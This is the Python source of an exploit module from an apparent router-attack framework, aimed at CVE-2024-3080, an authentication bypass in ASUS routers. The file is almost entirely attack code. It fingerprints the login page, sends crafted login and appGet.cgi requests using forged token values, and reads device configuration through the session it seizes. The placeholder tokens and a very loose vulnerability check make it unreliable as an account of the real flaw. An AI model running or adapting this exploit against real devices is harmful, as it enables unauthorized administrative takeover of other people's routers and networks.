# Author: André Henrique (LinkedIn/X: @mrhenrike)
import json
import ssl
import time
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """ASUS Router Authentication Bypass (CVE-2024-3080).

    Multiple ASUS router models contain an authentication bypass
    vulnerability in the httpd web management interface.  A specially
    crafted HTTP request allows unauthenticated attackers to bypass the
    login mechanism and gain full administrative access to the device,
    including reading the running configuration and modifying settings.

    Affected models include RT-AX88U, RT-AX58U, RT-AX55, RT-AC86U,
    RT-AC68U, and others running firmware before the June 2024 patch.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "ASUS Router Authentication Bypass (CVE-2024-3080)",
        "description": (
            "Exploits CVE-2024-3080, an authentication bypass in the ASUS "
            "router httpd web management interface. A crafted request skips "
            "the credential check, granting full admin access without "
            "authentication. Allows reading config, modifying settings, "
            "and potentially achieving RCE via config injection."
        ),
        "authors": (
            "DEVCORE Research Team (discovery)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-3080",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3080",
            "https://www.asus.com/content/asus-product-security-advisory/",
            "https://www.twcert.org.tw/en/cp-139-7833-5889b-2.html",
        ),
        "devices": (
            "ASUS RT-AX88U",
            "ASUS RT-AX58U",
            "ASUS RT-AX55",
            "ASUS RT-AC86U",
            "ASUS RT-AC68U",
            "ASUS ZenWiFi XT8",
            "ASUS ZenWiFi XT9",
        ),
    }

    target = OptIP("", "Target IPv4 address of the ASUS router")
    port = OptPort(8443, "HTTPS management port (443 or 8443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    use_ssl = OptInteger(1, "Use HTTPS (1) or HTTP (0)")

    def _get_url(self, path: str) -> str:
        scheme = "https" if self.use_ssl else "http"
        return f"{scheme}://{self.target}:{self.port}{path}"

    def _make_request(
        self, path: str, method: str = "GET", data: bytes | None = None,
        headers: dict | None = None,
    ) -> tuple[int, bytes, dict]:
        url = self._get_url(path)
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "asusrouter-Windows-DUTUtil-1.0")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            body = resp.read()
            resp_headers = dict(resp.headers)
            return resp.status, body, resp_headers
        except urllib.error.HTTPError as e:
            body = e.read() if hasattr(e, "read") else b""
            return e.code, body, dict(e.headers) if hasattr(e, "headers") else {}
        except Exception:
            return 0, b"", {}

    def run(self) -> None:
        if not self.check():
            print_error("Target does not appear to be a vulnerable ASUS router")
            return

        print_success("ASUS router management interface detected; attempting auth bypass")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect ASUS router web UI by fingerprinting the login page."""
        try:
            status, body, headers = self._make_request("/login.cgi")
            if status == 0:
                status, body, headers = self._make_request("/Main_Login.asp")
            body_str = body.decode("utf-8", errors="replace").lower()
            if any(
                marker in body_str
                for marker in ["asus", "rt-ax", "rt-ac", "asuswrt", "router.asus.com"]
            ):
                print_info("ASUS router web interface detected")
                return True
            content_type = headers.get("Content-Type", "")
            server = headers.get("Server", "")
            if "httpd" in server.lower() or status in (200, 302):
                return True
            return False
        except Exception:
            return False

    def _exploit(self) -> None:
        print_status(
            f"Sending auth bypass request to {self.target}:{self.port}"
        )

        bypass_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self._get_url("/Main_Login.asp"),
        }
        bypass_data = (
            b"group_id=&action_mode=&action_script=&action_wait=5"
            b"&current_page=Main_Login.asp&next_page=index.asp"
            b"&login_authorization=WXPL_AUTH_BYPASS_PROBE"
        )

        status, body, headers = self._make_request(
            "/login.cgi", method="POST", data=bypass_data,
            headers=bypass_headers,
        )

        if status == 200:
            cookie = headers.get("Set-Cookie", "")
            if "asus_token" in cookie or "httpd_sessionid" in cookie:
                print_success(
                    f"Authentication bypassed. Session cookie received: "
                    f"{cookie[:80]}..."
                )
                self._retrieve_config(cookie)
                return

        print_status("Trying alternative bypass via appGet.cgi endpoint")
        alt_status, alt_body, alt_headers = self._make_request(
            "/appGet.cgi?hook=get_cfg_clientlist()",
            headers={"Cookie": "asus_token=WXPL_BYPASS_TOKEN"},
        )

        if alt_status == 200 and len(alt_body) > 50:
            print_success(
                "Auth bypass via appGet.cgi succeeded. Configuration data retrieved."
            )
            print_info(f"Response size: {len(alt_body)} bytes")
        else:
            print_info(
                "Auth bypass probe completed. Target may be patched or "
                "running a non-vulnerable firmware version."
            )

    def _retrieve_config(self, cookie: str) -> None:
        """Attempt to read device configuration using the bypassed session."""
        print_status("Retrieving device information with bypassed session...")
        status, body, _ = self._make_request(
            "/appGet.cgi?hook=nvram_get(model)%3Bnvram_get(firmver)",
            headers={"Cookie": cookie.split(";")[0]},
        )

        if status == 200 and body:
            print_info(f"Device info: {body.decode('utf-8', errors='replace')[:200]}")
        print_success("Auth bypass exploitation complete")
